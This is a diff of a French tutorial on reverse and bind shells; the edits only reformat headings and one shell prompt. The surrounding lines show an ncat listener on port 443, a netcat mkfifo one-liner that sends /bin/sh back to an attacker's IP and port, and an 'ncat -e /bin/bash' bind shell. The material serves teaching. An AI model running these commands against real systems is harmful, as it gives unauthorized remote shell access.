@@ -45,7 +45,7 @@ user@ip:~$ sudo ncat -lvnp 443
 Listening on 0.0.0.0 443
 ```
 
-####2Execution du script
+#### 2- Execution du script
 
 Machine cible
 
@@ -58,7 +58,7 @@ user@raspberrypi: ~$ mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tm
 ```
 si ncat ne prends pas `-e`
 
-**Execution de commande sur la machine cible**.
+#### 3- Execution de commande sur la machine cible
 
 Notre machine
 
@@ -87,7 +87,7 @@ Un **blind shell** est ce qui se produit quand une cible va **démarrer un liste
 Machine cible
 
 ```shell
-root@raspberrypi:/home/thomas# ncat -vnlp 4433 -e /bin/bash
+user@raspberrypi:~$ ncat -vnlp 4433 -e /bin/bash
 Ncat: Version 7.80 ( https://nmap.org/ncat )
 Ncat: Listening on :::4433
 Ncat: Listening on 0.0.0.0:4433
